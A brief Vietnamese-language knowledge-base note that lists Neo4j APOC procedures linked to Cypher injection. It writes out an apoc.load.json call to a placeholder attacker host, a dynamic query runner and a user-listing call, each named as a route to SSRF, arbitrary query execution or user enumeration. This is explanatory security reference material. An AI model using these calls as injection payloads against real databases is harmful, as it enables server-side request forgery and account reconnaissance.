---
title: Neo4j APOC Procedures
type: entity
related: [[Neo4j Cypher Injection]]
---

Các APOC procedures được nhắc đến:

- `CALL apoc.load.json('http://attacker/x')`
- `CALL apoc.cypher.run("...", {})`
- `CALL dbms.security.listUsers()`

Chúng có thể dẫn đến SSRF, dynamic query execution, hoặc user enumeration nếu được bật.